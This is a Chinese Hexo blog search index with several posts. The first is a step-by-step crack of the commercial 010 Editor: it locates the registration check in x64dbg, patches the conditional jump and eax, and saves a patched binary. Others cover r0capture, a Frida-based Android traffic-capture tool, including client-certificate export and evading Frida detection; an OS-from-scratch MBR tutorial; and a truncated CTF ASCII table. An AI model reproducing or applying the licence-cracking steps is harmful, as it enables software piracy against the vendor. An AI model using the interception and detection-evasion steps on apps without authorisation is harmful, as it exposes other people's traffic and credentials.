<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>010Editor破解</title>
      <link href="/2023/09/22/010Editor%E7%A0%B4%E8%A7%A3/"/>
      <url>/2023/09/22/010Editor%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>010程序无壳可以放心使用，网上的破解方法也很多，但是大多数是使用注册机进行破解，这里我提供一个更简单的方法。</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>首先下载32位的最新版的010 Editor，将其载入Xdbg，查看其汇编代码。</p><p>先按F9使程序运行起来，按shift+d搜索字符串，我们要搜索的内容为刚进入程序时弹出来的内容，Evaluation</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922084153.png"></p><p>猜测具有换行符的才是真正的进入界面弹的字符串，将所有的字符串加个断点（F2）</p><p>可以看到，符合试用版提示的字符串有4个（都是换行符结尾），这4条指令地址非常接近，双击其中一条指令查看汇编代码，发现它们都在同一个子程序里，只是判断语句的分支不同。按F9运行一下，果然在启动之前能够中断，说明这段子程序就是在程序启动时用于检查注册状态的。</p><p>找到该程序段的入口地址，对其流程图进行分析</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922084428.png"></p><p>使用右键有个流程图或者直接选中那行按G</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922084553.png"></p><p>可以看到出现一个分支语句cmp 它主要是将eax里面的内容与0xDB进行对比，若对比通过则跳转到右边的不通过则跳转到左边，选中cmp eax,DB这一行按G返回，找到注册标志后，改程序流向是无效的，必须找到设置注册标志的公共CALL，在CALL里边改程序流向，才能真正实现破解。在这个程序中，判断注册标志指令是cmp eax, 0xDB，它上面的CALL是一个模块外的系统子程序调用（调用的QT的相关代码），再往上没有CALL了，怎么办？这说明这个标志已经提前由真正的CALL算好了，下面的关键是怎么找到这个真正的CALL：</p><p>单击选中 cmp eax, 0xDB指令，按Shift+C，复制二进制指令码，然后再按Ctrl+Shift+B，即在当前模块中按“匹配特征”进行搜索，按Ctrl+V粘贴二进制指令码，在主程序中查找所有的cmp eax, 0xDB 指令，如下图所示。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922085213.png"></p><p>点击确定</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922085302.png"></p><p>挨个点击跳转到程序块，发现每个cmp之前都有一个函数的调用语句，猜测这就是检查是否注册的函数。（反汇编后函数名字结果可能不同，自己仔细看）</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922085354.png"></p><p>选中该函数在反汇编中转到</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922085603.png"></p><p>然后再转一次，找到对应的程序块</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922085620.png"></p><p>转到之后如图所示</p><p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20230922085657334.png" alt="image-20230922085657334"></p><p>可以看到有个JE指令这个是条件满足跳转指令，要实现破解直接将eax赋值为0XDB即可，同时让JE指令跳转到该语句即可。右键汇编改掉相关代码。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922090003.png"></p><p>右键补丁将更改后的代码保存下来</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230922090110.png"></p><p>点击修补文件，保存相关名称即可</p><p>破击之后如下图所示（那个惜缘怀古是我自己加的）如果出现0 User License则证明破解成功。</p><p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20230922090233478.png" alt="image-20230922090233478"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>某APP的逆向分析</title>
      <link href="/2023/08/24/%E6%9F%90APP%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/24/%E6%9F%90APP%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>r0capture配置及使用</title>
      <link href="/2023/08/15/r0capture%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/08/15/r0capture%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="r0capture配置及使用"><a href="#r0capture配置及使用" class="headerlink" title="r0capture配置及使用"></a>r0capture配置及使用</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>github地址：<a href="https://github.com/r0ysue/r0capture">https://github.com/r0ysue/r0capture</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python版本&gt;=3.6</span><br><span class="line">pip install loguru</span><br><span class="line">pip install click</span><br></pre></td></tr></table></figure><h3 id="安装-frida"><a href="#安装-frida" class="headerlink" title="安装  frida"></a>安装  frida</h3><p>详见另一篇博客</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>先启动frida</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /data/local/tmp</span><br><span class="line">./fsarm64</span><br></pre></td></tr></table></figure><p>切记仅限安卓平台7、8、9、10、11 可用 ，禁止使用模拟器。</p><ul><li>Spawn 模式：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 r0capture.py -U -f com.coolapk.market -v</span><br></pre></td></tr></table></figure><ul><li>Attach 模式，抓包内容保存成pcap文件供后续分析：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 r0capture.py -U 酷安 -v -p iqiyi.pcap</span><br></pre></td></tr></table></figure><p>建议使用<code>Attach</code>模式，从感兴趣的地方开始抓包，并且保存成<code>pcap</code>文件，供后续使用Wireshark进行分析。</p><blockquote><p>老版本Frida使用包名，新版本Frida使用APP名。APP名必须是点开app后，frida-ps -U显示的那个app名字。</p></blockquote><ul><li>收发包函数定位：<code>Spawn</code>和<code>attach</code>模式均默认开启；</li></ul><blockquote><p>可以使用<code>python r0capture.py -U -f cn.soulapp.android -v  &gt;&gt; soul3.txt</code>这样的命令将输出重定向至txt文件中稍后过滤内容</p></blockquote><ul><li>客户端证书导出功能：默认开启；必须以Spawm模式运行；</li></ul><blockquote><p>运行脚本之前必须手动给App加上存储卡读写权限；</p></blockquote><blockquote><p>并不是所有App都部署了服务器验证客户端的机制，只有配置了的才会在Apk中包含客户端证书</p></blockquote><blockquote><p>导出后的证书位于/sdcard/Download/包名xxx.p12路径，导出多次，每一份均可用，密码默认为：r0ysue，推荐使用<a href="http://keystore-explorer.org/">keystore-explorer</a>打开查看证书。</p></blockquote><ul><li>新增host连接方式“-H”，用于Frida-server监听在非标准端口时的连接。有些App会检测Frida标准端口，因此frida-server开在非标准端口可以绕过检测。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统从0到1</title>
      <link href="/2023/07/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8E0%E5%88%B01/"/>
      <url>/2023/07/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<h1 id="一-部署工作环境"><a href="#一-部署工作环境" class="headerlink" title="一 部署工作环境"></a>一 部署工作环境</h1><p>开发环境：Ubuntu 20.04 LTS</p><p>首先是需要安装的东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt-get install libghc-x11-dev</span><br><span class="line">sudo apt-get install xorg-dev</span><br></pre></td></tr></table></figure><p>下载Bochs <a href="https://udomain.dl.sourceforge.net/project/bochs/bochs/2.6.8/bochs-2.6.8.tar.gz">https://udomain.dl.sourceforge.net/project/bochs/bochs/2.6.8/bochs-2.6.8.tar.gz</a></p><p>下载完毕之后将其移动至虚拟机中想要的位置，然后解压，命令：tar -zxvf bochs-2.6.8.tar.gz</p><p>为即将要安装的bochs创建一个空目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir bochs</span><br></pre></td></tr></table></figure><p>进入解压后的bochs-2.6.8文件夹 cd bochs-2.6.8</p><p>配置bochs的config文件（–prefix这后面填的是你想要安装bochs的目录），编译，安装</p><p>./configure –prefix=/home/ubuntu/Desktop/bochs –enable-debugger –enable-disasm –enable-iodebug –enable-x86-debugger –with-x –with-x11 LDFLAGS=’-pthread’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line"></span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>进入安装好bochs的目录 cd .. cd bochs创建bochsrc.disk 命令: touch bochsrc.disk，在其中写下配置信息（修改romimage:、romimage:、 keyboard:后面路径信息的前部分为自己的bochs安装路径）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">megs : 32</span><br><span class="line"></span><br><span class="line">romimage: file=/home/ubuntu/Desktop/bochs/share/bochs/BIOS-bochs-latest</span><br><span class="line">vgaromimage: file=/home/ubuntu/Desktop/bochs/share/bochs/VGABIOS-lgpl-latest</span><br><span class="line"></span><br><span class="line">boot: disk</span><br><span class="line"></span><br><span class="line">log: bochs.out</span><br><span class="line"></span><br><span class="line">mouse:enabled=0</span><br><span class="line">keyboard:keymap=/home/ubuntu/Desktop/bochs/share/bochs/keymaps/x11-pc-us.map</span><br><span class="line"></span><br><span class="line">ata0:enabled=1,ioaddr1=0x1f0,ioaddr2=0x3f0,irq=14</span><br><span class="line">ata0-master: type=disk, path=&quot;hd60M.img&quot;, mode=flat,cylinders=121,heads=16,spt=63</span><br><span class="line"></span><br><span class="line">#gdbstub:enabled=1,port=1234,text_base=0,data_base=0,bss_base=0</span><br></pre></td></tr></table></figure><p>创建启动磁盘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/bximage</span><br></pre></td></tr></table></figure><p>然后在输入框依次输入以下，输入一个，按一次回车</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">hd</span><br><span class="line">flat </span><br><span class="line">60</span><br><span class="line">hd60M.img</span><br></pre></td></tr></table></figure><p>测试代码,以下内容用作测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">touch mbr.s</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SECTION MBR vstart=0x7c00</span><br><span class="line">mov ax,0x0000;设置栈指应该是程序一开始就应该做的事情,这个值是参照1m内存空间布局图选择的，以后会刻意避开</span><br><span class="line">mov ss,ax</span><br><span class="line">mov ax,0x7c00</span><br><span class="line">mov sp,ax</span><br><span class="line"> </span><br><span class="line">mov ax,0x0600</span><br><span class="line">mov bx,0x0700;BH是设置缺省属性，属性是指背景色，前景色，是否闪烁等，例如07H表示黑底白字，70H表示灰底黑字等等。</span><br><span class="line">mov cx,0x0000</span><br><span class="line">mov dx,0x184f;这个看书p61，同时看其中关于页的知识</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">mov ax,0x0300</span><br><span class="line">mov bx,0x0000</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">mov ax,0x0000</span><br><span class="line">mov es,ax</span><br><span class="line">mov ax,message</span><br><span class="line">mov bp,ax</span><br><span class="line">mov ax,0x1301</span><br><span class="line">mov bx,0x0007;设置字体属性，02是黑底绿字，07是黑底白字</span><br><span class="line">mov cx,0x000c</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">jmp $</span><br><span class="line">message db &quot;Hello World!&quot;</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>安装编译器nasm 命令: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nasm</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -o test mbr.s</span><br></pre></td></tr></table></figure><p>写入虚拟机启动磁盘 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/home/ubuntu/Desktop/test of=/home/ubuntu/Desktop/bochs/hd60M.img bs=512 count=1 conv=notrunc</span><br></pre></td></tr></table></figure><p>启动虚拟机查看效果（在bochs目录下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd bochs</span><br><span class="line"></span><br><span class="line">bin/bochs -f bochsrc.disk</span><br></pre></td></tr></table></figure><p>启动之后，输入c即可看见Hello world!</p><h1 id="二-编写-MBR-主引导记录，让我们开始掌权"><a href="#二-编写-MBR-主引导记录，让我们开始掌权" class="headerlink" title="二 编写 MBR 主引导记录，让我们开始掌权"></a>二 编写 MBR 主引导记录，让我们开始掌权</h1><h2 id="2-1-计算机的启动过程"><a href="#2-1-计算机的启动过程" class="headerlink" title="2.1 计算机的启动过程"></a>2.1 计算机的启动过程</h2><p>任何程序执行必须先载入内存，所谓的载入内存，大概上分为两个部分。</p><p>（1）程序被加载器（软件或硬件）加载到内存某个区域。</p><p>（2）CPU 的 cs：ip 寄存器被指向这个程序的起始地址</p><p>从按下主机上的 power 键后，第一个运行的软件是 BIOS。</p><h2 id="2-2-软件接力第一棒，BIOS"><a href="#2-2-软件接力第一棒，BIOS" class="headerlink" title="2.2 软件接力第一棒，BIOS"></a>2.2 软件接力第一棒，BIOS</h2><p>BIOS 全称叫 Base Input &amp; Output System，即基本输入输出系统。</p><h3 id="2-2-1-实模式下的-1MB-内存布局"><a href="#2-2-1-实模式下的-1MB-内存布局" class="headerlink" title="2.2.1 实模式下的 1MB 内存布局"></a>2.2.1 实模式下的 1MB 内存布局</h3><p>这里我们举例Intel 8086在实模式下的内存布局</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230703001736.png"></p><p>先从低地址看，地址 0～0x9FFFF 处是 DRAM（Dynamic Random Access Memory），即动态随机访问 内存，我们所装的物理内存就是 DRAM。</p><p>看顶部的 0xF0000～0xFFFFF，这 64KB 的内 存是 ROM。这里面存的就是 BIOS 的代码。BIOS 的主要工作是检测、初始化硬件，怎么初始化的？硬件自己提 供了一些初始化的功能调用，BIOS 直接调用就好了。BIOS 还做了一件伟大的事情，建立了中断向量表，这样 就可以通过“int 中断号”来实现相关的硬件调用，当然 BIOS 建立的这些功能就是对硬件的 IO 操作，也就是输 入输出，但由于就 64KB 大小的空间，不可能把所有硬件的 IO 操作实现得面面俱到，而且也没必要实现那么多， 毕竟是在实模式之下，对硬件支持得再丰富也白搭，精彩的世界是在进入保护模式以后才开始，所以挑一些重要 的、保证计算机能运行的那些硬件的基本 IO 操作，就行了。这就是 BIOS 称为基本输入输出系统的原因。</p><p>在CPU眼里，插在主板上的物理内存并不是它眼里的“全部的内存”，归根结底的原因是这样的：在计算机中，并不是只有咱们插在主板上的内存条需要通过地址总线访问， 还有一些外设同样是需要通过地址总线来访问的，这类设备还很多呢。若把全部的地址总线都指向物理内 存，那其他设备该如何访问呢？由于这个原因，只好在地址总线上提前预留出来一些地址空间给这些外设 用，这片连续的地址给显存，这片连续的地址给硬盘控制器等。留够了以后，地址总线上其余的可用地址 再指向 DRAM，也就是指插在主板上的内存条、我们眼中的物理内存。</p><h3 id="2-2-2-BIOS-是如何苏醒的"><a href="#2-2-2-BIOS-是如何苏醒的" class="headerlink" title="2.2.2 BIOS 是如何苏醒的"></a>2.2.2 BIOS 是如何苏醒的</h3><p>BIOS 本身是个程序，程序要执行，就要有个入口地址才行，此入口地址便是 0xFFFF0。在开机的一瞬间，也就是接电的一瞬间，CPU 的 cs：ip 寄存器被强制初始化为 0xF000：0xFFF0。由于 开机的时候处于实模式，再重复一遍加深印象，在实模式下的段基址要乘以16，也就是左移4位，于是0xF000： 0xFFF0 的等效地址将是 0xFFFF0。上面说过了，此地址便是 BIOS 的入口地址。但是此处并不是真正的代码，因为由于实模式下的寄存器宽度是 16 位，0xFFFF0+16 已经超过了其最大值 0xFFFFF。溢出的部分就会回卷到 0，又会重新开始，即 0xFFFF0+16 等于 0，0xFFFF0+17 等于 1。所以此处的代码为跳转代码。真正的代码储存在跳转代码的所跳转的位置，接下来 BIOS 便马不停蹄地检测内存、显卡等外设信息，当检测通过，并初始化好硬件后，开始在内 存中 0x000～0x3FF 处建立数据结构，中断向量表 IVT 并填写中断例程。</p><h3 id="2-2-3-为什么是-0x7c00"><a href="#2-2-3-为什么是-0x7c00" class="headerlink" title="2.2.3 为什么是 0x7c00"></a>2.2.3 为什么是 0x7c00</h3><p>计算机执行到这份上，BIOS 也即将完成自己的历史使命了，BIOS 最后一项工作校验启动盘中位于 0 盘 0 道 1 扇区的内容。如果此扇区末尾的两个字节分别是魔数 0x55 和 0xaa，BIOS 便认为此扇区中确实存在可执 行的程序（在此先剧透一下，此程序便是久闻大名的主引导记录 MBR），便加载到物理地址 0x7c00，随 后跳转到此地址，继续执行。至于为什么是 0x7c00，8086CPU 要求物理地址 0x0～0x3FF 存放中断向量表，所以此处不能动了，再选新的地方看看。 按 DOS 1.0 要求的最小内存 32KB 来说，MBR 希望给人家尽可能多的预留空间，这样也是保全自己 的作法，免得过早被覆盖。所以 MBR 只能放在 32KB 的末尾。 MBR 本身也是程序，是程序就要用到栈，栈也是在内存中的，MBR 虽然本身只有 512 字节，但还要为其 所用的栈分配点空间，所以其实际所用的内存空间要大于 512 字节，估计 1KB 内存够用了。 结合以上三点，选择32KB中的最后1KB最为合适，那此地址是多少呢？32KB换算为十六进制为0x8000， 减去 1KB(0x400)的话，等于 0x7c00。这就是倍受质疑的 0x7c00 的由来，这下清楚了。 可见，加载 MBR 的位置取决于操作系统本身所占内存大小和内存布局。</p><h2 id="2-3-让-MBR-先飞一会儿"><a href="#2-3-让-MBR-先飞一会儿" class="headerlink" title="2.3 让 MBR 先飞一会儿"></a>2.3 让 MBR 先飞一会儿</h2><p>MBR 的大小必须是 512 字节，这是为了保证 0x55 和 0xaa 这两个 魔数恰好出现在该扇区的最后两个字节处，即第 510 字节处和第 511 字节处，这是按起始偏移为 0 算起的。 由于我们的 bochs 模拟的是 x86 平台，所以是小端字节序，故其最后两个字节内容是 0xaa55</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">                                ;主引导程序 </span><br><span class="line">                                ;------------------------------------------------------------</span><br><span class="line">SECTION MBR vstart=0x7c00         </span><br><span class="line">    mov ax,cs                   ;此时cs寄存器为0，自然可以用来将ax寄存器置0</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov fs,ax</span><br><span class="line">    mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">                                ; 清屏 利用0x06号功能，上卷全部行，则可清屏。</span><br><span class="line">                                ; -----------------------------------------------------------</span><br><span class="line">                                ;INT 0x10   功能号:0x06   功能描述:上卷窗口</span><br><span class="line">                                ;------------------------------------------------------</span><br><span class="line">                                ;输入：</span><br><span class="line">                                ;AH 功能号= 0x06</span><br><span class="line">                                ;AL = 上卷的行数(如果为0,表示全部)</span><br><span class="line">                                ;BH = 上卷行属性</span><br><span class="line">                                ;(CL,CH) = 窗口左上角的(X,Y)位置</span><br><span class="line">                                ;(DL,DH) = 窗口右下角的(X,Y)位置</span><br><span class="line">                                ;无返回值：</span><br><span class="line">    mov ax, 0x600               ;ah中输入功能号</span><br><span class="line">    mov bx, 0x700               ;设置上卷行属性，0x70表示用黑底白字的属性填充空白行</span><br><span class="line">    mov cx, 0                   ;左上角: (0, 0)</span><br><span class="line">    mov dx, 0x184f            ;右下角: (80,25),</span><br><span class="line">                    ;VGA文本模式中,一行只能容纳80个字符,共25行。</span><br><span class="line">                    ;下标从0开始,所以0x18=24,0x4f=79</span><br><span class="line">    int 0x10                    ;int 0x10</span><br><span class="line"></span><br><span class="line">                                ;;;;;;;;;    下面这三行代码是获取光标位置    ;;;;;;;;;</span><br><span class="line">    mov ah, 3            ;输入: 3号子功能是获取光标位置,需要存入ah寄存器</span><br><span class="line">    mov bh, 0            ;bh寄存器存储的是待获取光标的页号</span><br><span class="line"></span><br><span class="line">    int 0x10            ;输出: ch=光标开始行,cl=光标结束行</span><br><span class="line">                    ;dh=光标所在行号,dl=光标所在列号</span><br><span class="line"></span><br><span class="line">                                ;;;;;;;;;    获取光标位置结束    ;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">                                ;;;;;;;;;     打印字符串    ;;;;;;;;;;;</span><br><span class="line">                                ;还是用10h中断,不过这次是调用13号子功能打印字符串</span><br><span class="line">    mov ax, message </span><br><span class="line">    mov bp, ax            ; es:bp 为串首地址, es此时同cs一致，</span><br><span class="line">                    ; 开头时已经为sreg初始化</span><br><span class="line"></span><br><span class="line">                                ; 光标位置要用到dx寄存器中内容,cx中的光标位置可忽略</span><br><span class="line">    mov cx, 5            ; cx 为串长度,不包括结束符0的字符个数</span><br><span class="line">    mov ax, 0x1301            ; 子功能号13是显示字符及属性,要存入ah寄存器,</span><br><span class="line">                    ; al设置写字符方式 ah=01: 显示字符串,光标跟随移动</span><br><span class="line">    mov bx, 0x2            ; bh存储要显示的页号,此处是第0页,</span><br><span class="line">                    ; bl中是字符属性, 属性黑底绿字(bl = 02h,07是黑底白字)</span><br><span class="line">    int 0x10            ; 执行BIOS 0x10 号中断</span><br><span class="line">                                ;;;;;;;;;      打字字符串结束 ;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">    jmp $                ; 使程序悬停在此</span><br><span class="line"></span><br><span class="line">    message db &quot;1 MBR&quot;</span><br><span class="line">    times 510-($-$$) db 0</span><br><span class="line">    db 0x55,0xaa</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注：使用dd命令时需要重新创建硬盘</p><p>创建启动磁盘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/bximage</span><br></pre></td></tr></table></figure><p>然后在输入框依次输入以下，输入一个，按一次回车</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">hd</span><br><span class="line">flat </span><br><span class="line">60</span><br><span class="line">hd60M.img</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -o mbr mbr.s</span><br></pre></td></tr></table></figure><p>然后用dd命令写入bochs的虚拟硬盘，命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/home/ubuntu/Desktop/test of=/home/ubuntu/Desktop/bochs/hd60M.img bs=512 count=1 conv=notrunc</span><br></pre></td></tr></table></figure><p>启动，之后默认为6输入c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/bochs –f bochsrc.disk</span><br></pre></td></tr></table></figure><p>可以看到有结果出现</p><h1 id="三-完善MBR"><a href="#三-完善MBR" class="headerlink" title="三 完善MBR"></a>三 完善MBR</h1><h2 id="3-1-地址，section-vstart浅尝辄止"><a href="#3-1-地址，section-vstart浅尝辄止" class="headerlink" title="3.1 地址，section,vstart浅尝辄止"></a>3.1 地址，section,vstart浅尝辄止</h2><h3 id="3-1-1-什么是地址"><a href="#3-1-1-什么是地址" class="headerlink" title="3.1.1 什么是地址"></a>3.1.1 什么是地址</h3><p>地址只是数字，描述各种符号在源程序中的位置，它是源代码文件中各符号偏移文件开头的距离。由 于指令和变量所占内存大小不同，故它们相对于文件开头的偏移量参差不齐。源文件就像旅店一样，里面 的符号（指令、变量等）就像旅店里的房间，有单人间、双人间，虽然大小不同，但它们也需要被旅店管 理员编号，也就是每个房间都有房间号，这样房客通过房间号便能找到自己的住所。</p><h3 id="3-1-2-什么是section"><a href="#3-1-2-什么是section" class="headerlink" title="3.1.2 什么是section"></a>3.1.2 什么是section</h3><p>简单点来说就是方便开发人员理清程序用的，关键字 section 并没有对程序中的地址产生任何影响，即在默 认情况下，有没有 section 都一个样，section 中数据的地址依然是相对于整个文件的顺延，仅仅是在逻辑 上让开发人员梳理程序之用</p><h3 id="3-1-3-什么是vstart"><a href="#3-1-3-什么是vstart" class="headerlink" title="3.1.3 什么是vstart"></a>3.1.3 什么是vstart</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctfRE</title>
      <link href="/2023/04/24/buuctfRE/"/>
      <url>/2023/04/24/buuctfRE/</url>
      
        <content type="html"><![CDATA[<h1 id="Ascii码表"><a href="#Ascii码表" class="headerlink" title="Ascii码表"></a>Ascii码表</h1><p>ASCII ((American Standard Code for Information Interchange):  美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是最通用的信息交换标准，并等同于国际标准ISO/IEC 646。ASCII第一次以规范标准的类型发表是在1967年，最后一次更新则是在1986年，到目前为止共定义了128个字符。</p><p>ASCII码表具体如下所示：</p><table><thead><tr><th>Bin (二进制)</th><th>Oct (八进制)</th><th>Dec (十进制)</th><th>Hex (十六进制)</th><th>缩写/字符</th><th>解释</th></tr></thead><tbody><tr><td>0000 0000</td><td>00</td><td>0</td><td>0x00</td><td>NUL(null)</td><td>空字符</td></tr><tr><td>0000 0001</td><td>01</td><td>1</td><td>0x01</td><td>SOH(start of headline)</td><td>标题开始</td></tr><tr><td>0000 0010</td><td>02</td><td>2</td><td>0x02</td><td>STX (start of text)</td><td>正文开始</td></tr><tr><td>0000 0011</td><td>03</td><td>3</td><td>0x03</td><td>ETX (end of 